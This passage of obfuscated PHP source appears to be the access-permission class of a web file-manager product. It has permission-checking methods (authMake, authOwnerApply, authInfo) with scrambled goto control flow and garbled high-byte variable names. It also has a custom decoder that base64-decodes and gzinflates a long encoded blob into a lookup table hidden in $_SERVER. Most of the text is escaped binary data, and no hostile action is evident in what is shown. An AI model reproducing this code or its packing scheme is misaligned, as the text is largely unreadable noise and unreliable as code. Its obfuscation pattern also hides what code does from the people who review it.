(!$A’¨áß²‡ || $A’¨áß²‡[$a”µÊÌêÉ[388]] <= 0) { $Aæ³Áå¾£ = $this->authDeepCheck($AÌ‚ç’†¦[$a”µÊÌêÉ[380]]); if ($Aæ³Áå¾£) { $A’¨áß²‡ = $Aæ³Áå¾£; } } goto e…æÆİáº‚; eƒ¼İ¯Ú©“: $A’¨áß²‡ = !1; foreach ($F×êëºòç as $C¯ò‡ŸÉÂ«) { if (!isset($b°›«ÔÈã¸[$C¯ò‡ŸÉÂ«])) { continue; } $eâ«÷›ö±‘ = $this->authMake($b°›«ÔÈã¸[$C¯ò‡ŸÉÂ«]); if ($eâ«÷›ö±‘[$a”µÊÌêÉ[429]]) { $A’¨áß²‡ = $eâ«÷›ö±‘; break; } } if (!$f³ª¸‰‡áó) { return $A’¨áß²‡; } goto EŞöùïÆß; EÌåö®½¹: $a”µÊÌêÉ =& $_SERVER[¹÷ˆ§éÒ°ú]; $A”ÕĞ¼ø– = Session::get($a”µÊÌêÉ[2227]); $A”ÕĞ¼ø– = array_to_keyvalue($A”ÕĞ¼ø–, $a”µÊÌêÉ[2098]); goto eïÜÄŒã‡; eïÜÄŒã‡: $c¿äÖƒ‡† = $a”µÊÌêÉ[95]; $F×êëºòç = Model($a”µÊÌêÉ[1108])->parentLevelArray($AÌ‚ç’†¦[$a”µÊÌêÉ[472]]); $F×êëºòç = array_merge(array($AÌ‚ç’†¦[$a”µÊÌêÉ[380]]), array_reverse($F×êëºòç)); goto eµê¬òìÚ; e…æÆİáº‚: return $A’¨áß²‡; goto a†‚§’«‰ã; eµê¬òìÚ: $có—‘‰ßŒ‚ = $AÌ‚ç’†¦[$a”µÊÌêÉ[469]]; $f³ª¸‰‡áó = $AÌ‚ç’†¦[$a”µÊÌêÉ[382]] == SourceModel::TYPE_GROUP; if ($f³ª¸‰‡áó && isset($A”ÕĞ¼ø–[$có—‘‰ßŒ‚]) && !_get($GLOBALS, $a”µÊÌêÉ[470])) { $f×ÑÎ½„Şâ = $A”ÕĞ¼ø–[$có—‘‰ßŒ‚]; if (Model($a”µÊÌêÉ[2261])->authCheckRoot($f×ÑÎ½„Şâ[$a”µÊÌêÉ[387]][$a”µÊÌêÉ[387]])) { $f“­‰¦œÊ = Model($a”µÊÌêÉ[471])->getInfo($có—‘‰ßŒ‚); $A’¨áß²‡ = array($a”µÊÌêÉ[2274] => intval($f×ÑÎ½„Şâ[$a”µÊÌêÉ[387]][$a”µÊÌêÉ[387]]), $a”µÊÌêÉ[2275] => $f×ÑÎ½„Şâ[$a”µÊÌêÉ[387]], $a”µÊÌêÉ[2269] => array($a”µÊÌêÉ[399] => $a”µÊÌêÉ[2276], $a”µÊÌêÉ[2277] => $f“­‰¦œÊ[$a”µÊÌêÉ[402]][$a”µÊÌêÉ[380]], $a”µÊÌêÉ[2278] => $f“­‰¦œÊ[$a”µÊÌêÉ[476]])); return $A’¨áß²‡; } } goto eƒ¼İ¯Ú©“; a†‚§’«‰ã: } public function authOwnerApply($bÏÒÉçÁÔ) { goto EÌÑìƒİî‘; EÌÑìƒİî‘: $F›¾Ã˜Ëåò =& $_SERVER[¹÷ˆ§éÒ°ú]; if (empty($bÏÒÉçÁÔ[$F›¾Ã˜Ëåò[387]]) || isset($bÏÒÉçÁÔ[$F›¾Ã˜Ëåò[2280]]) && $bÏÒÉçÁÔ[$F›¾Ã˜Ëåò[2280]]) { return $bÏÒÉçÁÔ; } if (AuthModel::authCheckRoot($bÏÒÉçÁÔ[$F›¾Ã˜Ëåò[387]][$F›¾Ã˜Ëåò[388]])) { return $bÏÒÉçÁÔ; } goto EÓ±ã¸®ø; EÓ±ã¸®ø: $DÏî¬‡«Ü° = Model($F›¾Ã˜Ëåò[1108])->parentLevelArray($bÏÒÉçÁÔ[$F›¾Ã˜Ëåò[472]]); $DÏî¬‡«Ü° = array_merge(array($bÏÒÉçÁÔ[$F›¾Ã˜Ëåò[380]]), array_reverse($DÏî¬‡«Ü°)); $BÎ¦­¸×Ñ = $F›¾Ã˜Ëåò[2264]; goto cŸê†í¾Ğ; dÄ°ºœÈ: $CæŒ¬”ôÛ½ = array(); $aŒù¨ï‘Õ = array(); foreach ($d¼ÛÛê˜ as $Fâá´¢¶ˆ¸ => $c×³‚ˆ·º‚) { $Dè­ßê‚¸÷ = $this->authFolderOwnerUser($c×³‚ˆ·º‚); $CæŒ¬”ôÛ½[$Fâá´¢¶ˆ¸] = $Dè­ßê‚¸÷; $aŒù¨ï‘Õ = array_merge($aŒù¨ï‘Õ, $Dè­ßê‚¸÷[$F›¾Ã˜Ëåò[548]]); if ($Dè­ßê‚¸÷[$F›¾Ã˜Ëåò[2281]]) { break; } } goto dÔ°¹¨ÔÏ; dÔ°¹¨ÔÏ: if (count($aŒù¨ï‘Õ) == 0) { $aŒù¨ï‘Õ = $this->authFolderOwnerGroup($bÏÒÉçÁÔ[$F›¾Ã˜Ëåò[469]]); } $aŒù¨ï‘Õ = array_unique($aŒù¨ï‘Õ); if (AuthModel::authCheckRoot($bÏÒÉçÁÔ[$F›¾Ã˜Ëåò[387]][$F›¾Ã˜Ëåò[388]])) { $aŒù¨ï‘Õ[] = USER_ID; } goto e®’§†ö°à; cŸê†í¾Ğ: $bŠƒ·õ§¬ = array($F›¾Ã˜Ëåò[394] => array($F›¾Ã˜Ëåò[395], $DÏî¬‡«Ü°)); $d¼ÛÛê˜ = $this->field($BÎ¦­¸×Ñ)->where($bŠƒ·õ§¬)->select(); $d¼ÛÛê˜ = array_to_keyvalue_group($d¼ÛÛê˜, $F›¾Ã˜Ëåò[380]); goto dÄ°ºœÈ; e®’§†ö°à: $bÏÒÉçÁÔ[$F›¾Ã˜Ëåò[387]][$F›¾Ã˜Ëåò[2282]] = Model($F›¾Ã˜Ëåò[487])->userListInfo($aŒù¨ï‘Õ); return $bÏÒÉçÁÔ; goto eºê™¹¹ºğ; eºê™¹¹ºğ: } private function authFolderOwnerGroup($Eíî‚Š…“Ü) { $fº‡«¿…™’ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AøÚ„ƒ¼à = Model($fº‡«¿…™’[2177])->where(array($fº‡«¿…™’[2098] => $Eíî‚Š…“Ü))->select(); $CÏäŸÚÛãÖ = array(); if (!$AøÚ„ƒ¼à) { return $CÏäŸÚÛãÖ; } foreach ($AøÚ„ƒ¼à as $cµËñ…Ó¢Ì) { $f÷–ÒîÆÖ = $this->authInfo($cµËñ…Ó¢Ì); if (AuthModel::authCheckRoot($f÷–ÒîÆÖ[$fº‡«¿…™’[387]])) { $CÏäŸÚÛãÖ[] = $cµËñ…Ó¢Ì[$fº‡«¿…™’[1427]]; } } return $CÏäŸÚÛãÖ; } private function authFolderOwnerUser($c™Ğì›‚Ü£) { $aË»—Âœ =& $_SERVER[¹÷ˆ§éÒ°ú]; $F‰–¹ÂÅÅ† = array(); $CªïÖèø¿ = !1; foreach ($c™Ğì›‚Ü£ as $DÚš†í­Üâ) { $cÀ³å«……Ä = $this->authInfo($DÚš†í­Üâ); if ($DÚš†í­Üâ[$aË»—Âœ[469]] == $aË»—Âœ[481]) { $CªïÖèø¿ = !0; } if ($DÚš†í­Üâ[$aË»—Âœ[382]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($cÀ³å«……Ä[$aË»—Âœ[387]])) { $F‰–¹ÂÅÅ†[] = $DÚš†í­Üâ[$aË»—Âœ[469]]; } } } return array($aË»—Âœ[548] => $F‰–¹ÂÅÅ†, $aË»—Âœ[2281] => $CªïÖèø¿); } public function authMake($B°Ë«Ÿ¶Îä) { goto f½¬¤‰ŸÀÙ; d„ÔÎ‡±ó: $Fç”å‰°—á = array_to_keyvalue($eØ¡Õšß÷¿, $F°ñˆ‘·Ğ[43], $F°ñˆ‘·Ğ[2098]); $f³¥ª‹óØ• = 0; $D–ƒ³Á½©ƒ = 0; goto a£¸µ¾ÏÕË; cáÃãÙè¹‘: $fæĞšÊãÔ = array($F°ñˆ‘·Ğ[2274] => intval($Bœé…¤â“ì), $F°ñˆ‘·Ğ[2275] => $CšÀŠîÃ×, $F°ñˆ‘·Ğ[2269] => array($F°ñˆ‘·Ğ[399] => $F…ƒà¦†ì, $F°ñˆ‘·Ğ[87] => $CÇ•ŸŸø[$F°ñˆ‘·Ğ[380]])); return $fæĞšÊãÔ; goto D§»„ƒ¾ë…; a£¸µ¾ÏÕË: $aŞë¥àî  = 0; $f¾ ·Åßğ£ = 0; $A…”µ¢Ï±¥ = 0; goto aĞ‚Ó”Á­ª; f½¬¤‰ŸÀÙ: $F°ñˆ‘·Ğ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$B°Ë«Ÿ¶Îä) { return array($F°ñˆ‘·Ğ[388] => 0, $F°ñˆ‘·Ğ[429] => !1); } $eØ¡Õšß÷¿ = Session::get($F°ñˆ‘·Ğ[2227]); goto d„ÔÎ‡±ó; Aä‰¬ï…ğÈ: $Bœé…¤â“ì = $C¨ôğÌ‘» ? $f³¥ª‹óØ• : ($b…†Ÿ¬Ü¾ ? $D–ƒ³Á½©ƒ : $aŞë¥àî ); $CšÀŠîÃ× = $C¨ôğÌ‘» ? $f¾ ·Åßğ£ : ($b…†Ÿ¬Ü¾ ? $A…”µ¢Ï±¥ : $F·Èƒ¹íÃ÷); $F…ƒà¦†ì = $C¨ôğÌ‘» ? $F°ñˆ‘·Ğ[2283] : ($b…†Ÿ¬Ü¾ ? $F°ñˆ‘·Ğ[2284] : ($Fº¥äŞˆÉô ? $F°ñˆ‘·Ğ[2285] : $F°ñˆ‘·Ğ[372])); goto cáÃãÙè¹‘; BÌ‰·Åç™: $Fº¥äŞˆÉô = 0; $CÇ•ŸŸø = array($F°ñˆ‘·Ğ[380] => 0); foreach ($B°Ë«Ÿ¶Îä as $CÇ•ŸŸø) { $CšÀŠîÃ× = $this->authInfo($CÇ•ŸŸø); $Dãâìİ¯µˆ = $CÇ•ŸŸø[$F°ñˆ‘·Ğ[469]]; $E‰¾œİÌ = intval($CšÀŠîÃ×[$F°ñˆ‘·Ğ[387]]); if ($CÇ•ŸŸø[$F°ñˆ‘·Ğ[382]] == SourceModel::TYPE_USER && $Dãâìİ¯µˆ == USER_ID) { $C¨ôğÌ‘» = !0; $f¾ ·Åßğ£ = $CšÀŠîÃ×; $f³¥ª‹óØ• = $E‰¾œİÌ; } else { if ($CÇ•ŸŸø[$F°ñˆ‘·Ğ[382]] == SourceModel::TYPE_GROUP && in_array($Dãâìİ¯µˆ, $Fç”å‰°—á)) { $b…†Ÿ¬Ü¾ = !0; if ($E‰¾œİÌ >= $D–ƒ³Á½©ƒ) { $D–ƒ³Á½©ƒ = $E‰¾œİÌ; $A…”µ¢Ï±¥ = $CšÀŠîÃ×; } } else { if ($Dãâìİ¯µˆ == $F°ñˆ‘·Ğ[481]) { $Fº¥äŞˆÉô = !0; $F·Èƒ¹íÃ÷ = $CšÀŠîÃ×; $aŞë¥àî  = $E‰¾œİÌ; } } } } goto Aä‰¬ï…ğÈ; aĞ‚Ó”Á­ª: $F·Èƒ¹íÃ÷ = 0; $C¨ôğÌ‘» = 0; $b…†Ÿ¬Ü¾ = 0; goto BÌ‰·Åç™; D§»„ƒ¾ë…: } public function authTargetInfoMake($aÉæËªïË¡) { goto eÍì«Ùß†; eÍì«Ùß†: $D¡Ë¤øˆÇ› =& $_SERVER[¹÷ˆ§éÒ°ú]; $c‘ğ¿¼ï = array(); $A››©¹Ô = array(); goto f²Ö±Ïõ—â; BØ‘ğ¶É¬: return array($D¡Ë¤øˆÇ›[2286] => $c‘ğ¿¼ï, $D¡Ë¤øˆÇ›[2278] => $A››©¹Ô); goto Aˆ™İÛºÜì; f²Ö±Ïõ—â: foreach ($aÉæËªïË¡ as $Cƒ· ¤») { if ($Cƒ· ¤»[$D¡Ë¤øˆÇ›[382]] == SourceModel::TYPE_USER) { $c‘ğ¿¼ï[] = intval($Cƒ· ¤»[$D¡Ë¤øˆÇ›[469]]); } else { if ($Cƒ· ¤»[$D¡Ë¤øˆÇ›[382]] == SourceModel::TYPE_GROUP) { $A››©¹Ô[] = intval($Cƒ· ¤»[$D¡Ë¤øˆÇ›[469]]); } } } if ($c‘ğ¿¼ï) { $c‘ğ¿¼ï = Model($D¡Ë¤øˆÇ›[487])->userListInfo($c‘ğ¿¼ï); } if ($A››©¹Ô) { $f‡…ò‹ˆì‘ = array($D¡Ë¤øˆÇ›[2175] => array($D¡Ë¤øˆÇ›[395], $A››©¹Ô)); $A››©¹Ô = Model($D¡Ë¤øˆÇ›[471])->field($D¡Ë¤øˆÇ›[2188])->where($f‡…ò‹ˆì‘)->select(); $A››©¹Ô = array_to_keyvalue($A››©¹Ô, $D¡Ë¤øˆÇ›[2098]); } goto BØ‘ğ¶É¬; Aˆ™İÛºÜì: } public function authInfo($cù½“¿í¤Ï) { $CÛ¬÷¶ğ‹õ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($cù½“¿í¤Ï[$CÛ¬÷¶ğ‹õ[2242]]) { $bÖùãã¨À = Model($CÛ¬÷¶ğ‹õ[2261])->listData($cù½“¿í¤Ï[$CÛ¬÷¶ğ‹õ[2242]]); if (!$bÖùãã¨À) { return !1; $a°ğ¡„­… = Model($CÛ¬÷¶ğ‹õ[2261])->listData(); $c—ë¼Ü‰Ñ = array_filter_by_field($a°ğ¡„­…, $CÛ¬÷¶ğ‹õ[387], $CÛ¬÷¶ğ‹õ[481]); return $c—ë¼Ü‰Ñ; } $E’Ë„Ö¾¨± = array_field_key($bÖùãã¨À, array($CÛ¬÷¶ğ‹õ[378], $CÛ¬÷¶ğ‹õ[38], $CÛ¬÷¶ğ‹õ[387], $CÛ¬÷¶ğ‹õ[2116], $CÛ¬÷¶ğ‹õ[2119])); $E’Ë„Ö¾¨±[$CÛ¬÷¶ğ‹õ[2287]] = $cù½“¿í¤Ï; return $E’Ë„Ö¾¨±; } else { return array($CÛ¬÷¶ğ‹õ[396] => 0, $CÛ¬÷¶ğ‹õ[2104] => $cù½“¿í¤Ï[$CÛ¬÷¶ğ‹õ[2243]], $CÛ¬÷¶ğ‹õ[397] => $CÛ¬÷¶ğ‹õ[43], $CÛ¬÷¶ğ‹õ[2116] => $CÛ¬÷¶ğ‹õ[2288]); } } } goto eºÃÏ×÷¶è; f²ŸóÅ’”: if (!function_exists('_kodDe')) { function _kodDe($EâÁÑ†ä…Ô) { $EâÁÑ†ä…Ô = base64_decode($EâÁÑ†ä…Ô); $C—ôŞÄŒó = strlen($EâÁÑ†ä…Ô); $d»ÄŒ¬§ó¶ = ''; $cøÇ£†Çé— = ord($EâÁÑ†ä…Ô[0]) - 30; for ($Aãë…Ø·è® = 1; $Aãë…Ø·è® < $C—ôŞÄŒó; $Aãë…Ø·è® += 2) { if ($Aãë…Ø·è® + 1 < $C—ôŞÄŒó) { $d»ÄŒ¬§ó¶ .= chr(ord($EâÁÑ†ä…Ô[$Aãë…Ø·è® + 1]) + $cøÇ£†Çé—); $d»ÄŒ¬§ó¶ .= chr(ord($EâÁÑ†ä…Ô[$Aãë…Ø·è®]) + $cøÇ£†Çé—); } else { $d»ÄŒ¬§ó¶ .= chr(ord($EâÁÑ†ä…Ô[$Aãë…Ø·è®]) + $cøÇ£†Çé—); } } return $d»ÄŒ¬§ó¶; } } define(_kodDe('MuOlk3S+1eac'), "\xe8\xcc\xb5\xc6\xf5"); $_SERVER[¹÷ˆ§éÒ°ú] = explode("\174\3\174\1\174\5", gzinflate(substr(base64_decode('H4sIAAAAAAAAA519CXwbxfUwLdCWtEChhHIVFufwER2+cjm2E9mWbRHZUiQ5dmIZsZJW0saSVtld')._kodDe('Kzq8wQ/hBUZjM4GDlJaJ83fYAKeZ/fiPp7V4LpJ2g71FoURcNayyaVo2GOTuxLaOv6Yqr2bmbNlZsA==').base64_decode('N2ef+8ZtU3tOfWNq7xeu/gUOoL89cfios76zB/pvz9yKkcBv6w86p+H+z+aNf/josu1LGqSapsdO')."\37\76\342\263\147\56\372\344\267\207\35\243\75\133\72\377\220\343\357\275\160\370\205\331\367\376\155\323\205\37\277\174\256\361\342\277\327\234\160\373\3\307\367\354\163\371\365\313\156\17\215\156\277\340\333\367\277"."\165\144\357\307\337\271\173\257\225\203\243\312\351\117\256\336\64\374\322\266\315\163\156\315\375\365\310\335\267\376\370\251\227\277\330\271\352\225\246\105\177\76\54\372\336\11\67\335\76\366\372\21\55\77\373\350\276"."\131\273\177\20\71\62\72\170\350\76\367\174\366\223\357\176\343\325\135\167\176\343\7\77\375\354\300\137\245\266\356\351\271\273\263\120\377\345\307\147\334\375\275\243\357\370\336\232\357\16\235\172\347\236\77\76\160"."\316\7\77\131\173\374\316\365\255\256\131\327\234\161\356\320\2\337\167\77\271\174\163\170\101\237\261\340\252\352\247\357\371\361\314\226\77\74\126\327\373\257\215\337\330\357\333\253\76\374\175\352\224\251\216\317\235"."\x87\xde\xb6\xe2\x43\xcf\xf6\xbb\x5c\x37\x2c\x79\x73\xee\x69\x27\x2f\xb9\xd6\x7f\xef\xe0\xc1\x9b\xe\x5c\xfb\x7c\xed\xb7\xe6\x6c\x97\x66\x6d\xdd\x6f\xaf\xfd\xbf\x9f\x7e\xa0\xfa\xce\x39\xc7\x4d\x6d\x6e\xde\xb4\xe5\x2f\x6f\xe\x2c"."\73\47\272\340\256\23\376\164\363\314\375\177\172\325\17\317\72\376\245\13\157\70\352\316\137\365\216\266\357\177\315\306\341\23\367\235\261\357\274\273\316\377\370\142\367\304\176\127\154\73\273\357\264\331\337\272\335"."\x73\xc3\xfb\xbf\xaa\x79\x3f\xf7\xc6\x5f\xd7\x3e\x38\xe7\x6d\xf7\xc3\xb7\xee\x3b\xf9\xf0\x37\xf7\xd8\x3\xf7\xaf\x5c\x34\xb5\xac\x26\x27\x5d\x85\x4c\x1\x43\x52\x6a\x56\x31\xd4\x49\x5\xc7\x62\x32\x8c\x87\x41\xdc\x97\xe7\xe9\xb1"."\xb4\x62\xc6\x12\x5a\xde\x54\xf2\xa6\x81\xc1\x1d\x9e\xb0\xaf\x33\x16\xf4\x44\x7a\x49\xc1\x85\x82\xbb\xbc\xf0\x19\xf8\xa7\x19\xff\x24\x32\x4a\x62\x34\x26\xc7\x35\xdd\x54\x92\x18\x54\xcc\x67\xd5\xfc\x28\xe\xb7\xe0\x1f\x29\xaf\x99"."\222\62\256\32\364\123\340\303\51\65\215\303\52\251\225\33\377\30\153\263\252\111\253\336\37\210\304\302\3\301\240\67\24\211\221\22\305\364\234\226\44\241\202\254\313\71\122\170\101\321\15\360\51\261\270\130\101"."\53\50\171\13\204\3\222\262\51\307\145\203\224\324\325\21\353\362\6\375\201\125\261\310\252\240\227\140\304\143\153\213\212\76\201\143\50\30\66\145\335\214\250\71\205\141\214\351\254\136\35\336\36\137\277\24\11"."\171\372\303\236\316\210\57\320\217\301\235\201\276\76\137\244\34\36\12\370\375\35\236\316\345\345\51\301\220\247\247\317\43\201\372\201\21\123\363\51\255\106\72\16\247\34\47\325\342\100\267\252\144\111\317\347\145"."\x5a\x1d\x73\xa2\x40\x42\x11\x16\x2\x63\x90\x2f\x66\xb3\x38\xd2\xcf\x42\xa4\xfe\x4a\x4a\x2e\x66\x49\x9f\x75\x89\x91\x82\xae\xe6\x64\xda\xf4\xe5\xca\x4\x83\x72\xea\x53\xf3\x9\x1c\xf1\x8e\x9b\xba\xcc\xe1\xa0\xc6\x9\x5d\xc9\x1"."\12\303\260\260\327\357\355\214\110\260\232\122\167\50\320\47\221\241\310\311\206\251\350\322\140\257\67\344\225\140\325\333\252\121\213\253\45\234\157\240\37\164\210\344\361\373\245\351\112\60\225\134\201\26\203\363\124".strrev('l"lµá_'."\r".'\'™§Ù‹/aİİD‡ß°Pƒ€á'."\n".'ÕT)§Œ(yiË–„§ïU¤†òê,(')."\211\45\123\131\63\126\222\263\105\112\310\144\346\124\223\37\362\253\31\204\270\327\252\171\265\110\10\231\24\241\151\154\126\221\100\221\142\53\24\222\3\331\64\62\337\300\344\53\341\140\133\73\376\135\102\220\342".strrev(':ÃB˜» Ç&ËJ`fÏÅüáIZ}'."\n".'Ğ•Í@¤x].™›)D"M%.ŠdóT–„ù)Œİ”#')."\346\356\57\346\104\24\26\115\144\324\154\122\127\362\137\217\331\100\212\125\114\23\64\303\240\65\35\50\100\156\26\126\164\241\366\335\240\230\100\321\24\201\105\204\326\255\351\271\56\300\34\110\357\200\51\241\16".strrev('26FX}G»Í\\Fİíh7ÎK“É®2˜Ù²Q–ªJ.%©ş^ÿœ“ášµ0‹Št)"“¥HT')."\175\311\371\61\224\213\62\316\244\62\316\31\63\237\334\121\13\161\303\376\356\327\114\257\300\176\263\132\102\316\212\55\305\341\214\151\26\302\112\76\331\315\10\67\251\215\345\121\207\25\24\312\336\273\34\122\122".base64_decode('6pNWSb0tagulLkArqQnODTNmLstCtLUMZjCgOU5ooorElXGTdJK0JJGRdTB8bUUz5VzEVqSsmpBN')."\x55\xcb\xbb\xb5\x84\xa9\x98\x4e\xc3\xd4\x15\x99\x94\x56\xb5\x44\x82\x14\x1\x67\x77\x1d\xce\x45\x67\x4f\x27\x5e\xe7\x9c\x11\x5d\xce\x1b\x29\x45\x77\x7a\x9\x79\xb7\x48\xa0\x9f\x19\x77\xa3\x68\x5d\xaa\x51\xd0\xc\x15\x7e\xa6\x45"."\x92\x4d\x53\x4e\x64\x20\x67\xe0\xc5\xb7\x7d\x5\xbe\xa\x97\x3f\xa5\xc\xd7\x93\x48\x28\x86\xe1\x84\x59\x74\x2d\xeb\xf4\x64\xb3\xda\x98\x33\xa0\xab\x69\x15\xe4\xa9\xb3\x55\x13\x70\xad\x16\x89\xb2\xd4\x82\xaa\x2b\x6\x8d\x4a\x3d".base64_decode('fRGCDGqlOIO6nM7JLVKhGAc9Q+ZnBRjGJl9vkRIw6pByRcN06gpgPypYBMng+VLOPjieqpJ0hgEH').strrev('àè¦6 Àâ>ƒõ¡ å0NCI™|ìëM9Mx;"N‘<úÆ÷î¡`İ|Æ	7´0ÓD‘	fú¦à\'').base64_decode('wx0TLdKoloxr4y6a1E3YK0WGPVownSE5n4b9E58wFUKORilt7VC/kk+bGZox7A2t9IZi4UB3ZNAT')."\42\113\174\36\14\304\70\375\24\54\72\353\14\51\111\320\365\11\223\346\223\13\260\327\50\16\234\50\160\214\151\52\234\74\64\315\357\353\201\35\323\345\64\0\222\123\304\242\145\373\325\234\12\353\156\262\24"."\324\223\140\375\357\41\25\162\243\6\265\105\63\165\65\321\344\274\132\47\370\267\256\166\70\332\345\252\33\131\352\126\171\36\167\203\253\101\152\254\137\40\5\201\100\242\312\131\211\64\272\14\243\136\12\54\377".strrev('2…7¥9u&•¤F AÏñ†‹i5<5ù	^ä]zFóë8oŠï!‡]mÍ0’k€Š')."\x81\xb4\x9a\xe2\x7c\xdd\x7\x84\x1d\xd2\xb1\x98\xf3\xf1\x48\x58\xcd\x15\x28\x83\x32\x33\xc5\x5c\x5c\x8\xba\x79\x9\x84\x16\xc0\x90\x31\xb6\xa4\xb1\x35\x8\xc8\xab\x64\x35\x76\x93\x2c\x73\x1a\xbb\x29\xb3\x75\x87\x9b\xc0\xff\x9c".base64_decode('sya1nEylVDRxlSSeuRhUZ0npVWS+qJk6FJ/HaJyg9ClmRiP9DMRwUqUiqxutZVLJKrSXMgrl0kD0')."\52\261\316\53\350\112\112\45\164\13\144\55\0\347\134\130\65\102\40\23\224\175\150\174\20\212\250\34\140\162\206\55\33\234\351\303\210\260\62\167\17\370\375\261\316\100\177\4\210\251\30\62\30\362\105\274\224"."\x22\x3c\x5d\x31\x4f\x67\x90\x2d\x61\x7c\x98\x8\x2\x9c\x9e\xe5\xec\xd\x43\x4a\x8d\x2\xdf\xe7\xb\x4\x67\xb9\x74\xa1\x83\x2c\x15\x87\x1\x2f\x2c\x68\x79\x43\x71\x92\xbd\x8b\x33\xc9\x99\x2f\xc6\x58\x62\xe3\xbc\x65\x39\xb8\x70"."\74\356\224\163\223\316\234\142\312\116\126\165\353\372\46\105\304\145\322\107\206\200\63\313\54\130\124\301\336\203\56\254\301\100\230\144\130\12\241\100\32\211\53\72\251\107\160\200\44\345\204\341\357\361\106\350\242".base64_decode('KBORxTMYphyuCBB1dVLmjVtKK0IKHc9luWQVUy0DF9PiawD7AtQmV2qukw9SpNfXvzzWF+jy+mO+')."\176\300\36\42\345\360\201\140\227\207\216\272\10\357\10\320\375\42\201\16\0\6\261\322\343\367\331\321\275\103\276\160\44\134\61\11\300\6\274\266\24\260\17\13\206\274\335\276\41\26\355\366\171\375\135\341\130"."\xa7\xa7\xb3\x97\xe3\xf4\x7b\xfa\x48\x24\x96\x82\x3b\x21\xc3\x6d\xc5\x8f\x1\x4e\x17\x66\xfb\xa9\x58\x9\xee\xd\x69\x67\xc6\x2c\x9b\x97\x18\x15\xbd\x63\x9c\x40\xc0\xaa\xa5\x10\xa2\x24\xcd\x85\x3b\x52\xd4\x12\x22\xc\x27\xb4\x22"."\45\123\46\275\345\50\147\310\311\144\152\312\164\105\252\301\77\265\222\47\54\231\205\30\343\1\361\11\26\104\315\240\161\40\247\221\357\113\204\353\226\325\40\6\161\72\224\224\246\53\137\5\360\244\114\106\30".base64_decode('tjiYMDwNjIAHbX0BJaARidFJaICNgYdWJ8W3nbEA2J974KY1NhgK9PeQDGMZhVbAR7q/hkoxZO9q')."\x72\x5e\x4\x44\x10\x99\x4b\x93\xb4\xd3\xd7\x68\xb4\x2b\xa7\xf0\xcf\x5c\xfc\x3\xa4\x36\xf2\x71\x25\x4f\x7b\x3d\xe\x39\x32\xe3\x18\x74\xf3\x1\x66\xb\xe5\xa6\x5a\x91\x7d\x2d\xae\x69\x59\x3a\x81\xc1\x42\xcc\x18\x5\xdb\xf5\xae".strrev('X¨GšíË»J¢ÚÊëútÃyNÒ©ˆtˆ@Èû'."\0".'F Lp²”cû{–ˆUdW.4®SŒ‘(1').base64_decode('D/m8+9jo2LyaYec81wgI1NYtw1ESi7os0dkkf1FnuaF8UmMsrW2JuqPumqUtwx7npOycrHcudo7M')."\213\272\152\347\21\300\310\272\106\107\363\172\210\0\20\227\316\32\1\77\155\321\245\163\242\316\271\307\37\267\154\70\72\122\335\62\357\350\250\153\126\164\154\244\256\166\51\375\116\242\250\203\135\131\142\202\125"."\x35\x39\xaf\x6\x54\x9\xc8\x2d\xc\x25\x8f\x78\xa1\x80\x40\x13\x26\xd5\x2\x87\xae\x5b\xb0\x9e\xc2\xc1\x18\x2a\x69\x9e\x63\xd8\x19\x9d\x37\xb2\x54\xc8\x27\x80\xec\xdf\x2\x32\xb\x60\xcc\x19\x86\xe7\x71\xae\x86\x2d\x63\x59\xe1"."\274\47\364\121\314\47\70\167\205\363\42\56\47\10\37\120\323\171\66\205\300\112\316\166\303\126\161\171\335\34\374\273\236\16\144\132\241\353\61\74\344\322\11\165\26\363\352\132\272\307\317\53\153\111\100\63\51"."\175\307\25\163\114\241\344\1\340\226\70\40\16\272\137\3\111\102\54\213\244\63\362\5\276\117\122\320\246\201\264\242\20\203\362\326\30\213\45\225\74\31\247\175\10\266\221\220\13\112\130\150\141\54\26\361\164"."\370\275\61\312\141\10\47\246\161\304\25\73\330\211\31\150\32\347\250\224\77\44\270\254\154\254\315\112\210\31\110\212\256\153\172\13\72\15\64\212\5\50\204\201\355\222\11\372\123\2\173\150\251\255\135\302\335"."\x4c\x4f\x54\xc4\x4e\x2f\xc8\x54\x8c\x80\xdb\x5a\x26\x1a\xb8\x6b\xa2\xd1\xe2\xb0\x92\x1c\x19\x6\x84\x2c\x3b\x53\x23\xeb\x9a\xd6\xd7\x52\xf1\xd8\x1d\x5\xff\xd1\x8\xe6\x5f\xa4\xc6\x5\x3e\x7e\x6\x10\xb2\x12\x26\x5b\x70\xcb\xe"."\255\142\214\3\302\52\260\363\5\115\147\353\54\204\163\161\325\324\114\71\313\320\140\132\4\102\50\267\241\153\65\331\234\343\1\364\163\46\4\127\147\341\110\17\161\310\176\166\136\305\216\32\204\23\43\0\163".strrev('s8KáAÒ.,Ö²˜d"Ç(OQZ…&Î˜2˜Ê•grD}9ôA’rëå"ù:0yÓe[oüQ')."\x35\x77\xc0\x3\x8\x7\x5c\x53\x1d\x40\xcc\x73\xc0\x83\x1e\x7\x17\x55\x1d\xfc\xec\xc0\xc1\x4\x4f\x7\x91\x47\x1d\xbc\x74\x12\xf4\x75\x39\x54\xa3\xb\xc9\xc5\xa8\x5c\x94\x44\xeb\x6c\x66\xe0\x4e\x3c\x2b\x4f\x38\x70\xfd\xfd\x4a".base64_decode('Sck6aO0dtFEO2gIH2mh0kdoMAPogtUFBwCQyDjgccGxpKTBIu4FJ0w4uaTvSulYsBOmXhBiuDAHw')."\x9a\x32\x40\x48\xd3\x4c\x7\xdd\xf9\xb0\x40\x1f\xe3\x40\xb0\x3a\x3c\xb4\x92\xf\x38\xaf\x3d\x5b\x3e\x49\x13\x70\xdc\x5e\x7\xc\x85\xe9\xdd\x72\x49\x1c\xe0\x8a\x83\x9d\xb7\x12\x6\x3f\x3a\xe5\xc7\x78\x5c\x5c\xb2\xef\x40\xec\xe7"."\x42\xbc\x13\x79\x25\x22\x72\x3a\x2c\x7c\xde\x94\xd3\xf4\xdb\x15\x52\x71\x38\xa4\x24\x26\x12\x7c\x57\xd3\x25\x6c\x93\xac\x31\x36\xf4\x88\xe\x2b\x11\x53\xe5\xa1\x67\x4\xc2\x68\x6d\xc6\x3e\xfb\x50\xca\xe6\x74\x44\xc8\xc7\x42\x6c"."\xd3\x52\x37\x6f\x53\xa0\xc0\x57\x1c\xc8\x10\xc2\x80\xf\xa\x53\x9e\x82\x2\x9c\xc3\x14\xc9\xa\x29\x1b\x9\x2a\xcb\x8c\xd1\xcb\xb\x85\xc2\x84\xfa\xd3\xd6\x5b